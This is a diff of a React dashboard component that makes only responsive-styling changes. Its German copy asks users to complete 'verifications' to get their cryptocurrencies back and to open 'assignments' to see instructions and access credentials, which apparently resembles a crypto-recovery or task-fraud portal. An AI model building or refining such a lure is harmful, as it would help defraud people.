@@ -872,20 +872,20 @@ export default function Dashboard() {
         </main>
       ) : (
         /* ── Overview ── */
-        <main className="max-w-5xl mx-auto w-full px-6">
+        <main className="max-w-5xl mx-auto w-full px-4 sm:px-6">
           {/* Hero */}
-          <div className="pt-16 pb-12 text-center opacity-0 animate-fade-in" style={{ animationDelay: "0ms", animationFillMode: "forwards" }}>
-            <h1 className="font-serif text-4xl sm:text-5xl font-semibold tracking-tight text-[#0b1f3a]">
+          <div className="pt-8 pb-8 sm:pt-16 sm:pb-12 text-center opacity-0 animate-fade-in" style={{ animationDelay: "0ms", animationFillMode: "forwards" }}>
+            <h1 className="font-serif text-2xl sm:text-4xl md:text-5xl font-semibold tracking-tight text-[#0b1f3a]">
               Willkommen zurück
             </h1>
-            <p className="mt-4 text-base text-slate-600 max-w-3xl mx-auto leading-relaxed">
-              Bitte führen Sie die folgenden Verifikationen durch, um Ihre Kryptowährungen sicher auf Ihr Konto zurückzuführen.<br />
+            <p className="mt-3 sm:mt-4 text-sm sm:text-base text-slate-600 max-w-3xl mx-auto leading-relaxed">
+              Bitte führen Sie die folgenden Verifikationen durch, um Ihre Kryptowährungen sicher auf Ihr Konto zurückzuführen.<br className="hidden sm:inline" />
               Klicken Sie auf einen Auftrag, um die Anleitung und Zugangsdaten einzusehen.
             </p>
           </div>
 
           {/* Grid */}
-          <div className="grid grid-cols-2 sm:grid-cols-3 gap-4 pb-16 opacity-0 animate-fade-in" style={{ animationDelay: "150ms", animationFillMode: "forwards" }}>
+          <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 sm:gap-4 pb-10 sm:pb-16 opacity-0 animate-fade-in" style={{ animationDelay: "150ms", animationFillMode: "forwards" }}>
             {/* Real assignments */}
             {assignments.map((a) => (
               <Card
@@ -893,19 +893,19 @@ export default function Dashboard() {
                 onClick={() => setSelectedId(a.id)}
                 className="border-slate-200 bg-white shadow-sm cursor-pointer transition-all duration-200 hover:border-[#0b1f3a]/40 hover:shadow-md hover:shadow-[#0b1f3a]/10 group"
               >
-                <CardContent className="p-0 aspect-square flex flex-col items-center justify-center text-center gap-3 px-4">
+                <CardContent className="p-0 aspect-square flex flex-col items-center justify-center text-center gap-2 sm:gap-3 px-3 sm:px-4">
                   <VerificationLogo
                     value={a.verification?.logo_url ?? null}
                     alt={a.verification?.title ?? ""}
-                    className="w-14 h-14 rounded-xl object-contain bg-slate-50 border border-slate-200 p-2 transition-transform duration-200 group-hover:scale-105"
+                    className="w-12 h-12 sm:w-14 sm:h-14 rounded-xl object-contain bg-slate-50 border border-slate-200 p-2 transition-transform duration-200 group-hover:scale-105"
                     fallback={
-                      <div className="w-14 h-14 rounded-xl bg-slate-50 border border-slate-200 flex items-center justify-center">
+                      <div className="w-12 h-12 sm:w-14 sm:h-14 rounded-xl bg-slate-50 border border-slate-200 flex items-center justify-center">
                         <span className="text-xl font-bold text-slate-400">{(a.verification?.title ?? "A").charAt(0)}</span>
                       </div>
                     }
                   />
-                  <div className="space-y-1.5">
-                    <p className="text-sm font-semibold text-[#0b1f3a] truncate max-w-full">
+                  <div className="space-y-1 sm:space-y-1.5 w-full">
+                    <p className="text-xs sm:text-sm font-semibold text-[#0b1f3a] line-clamp-2 max-w-full leading-snug">
                       {a.verification?.title ?? "Auftrag"}
                     </p>
                     <AssignmentStatusBadge status={a.status} />
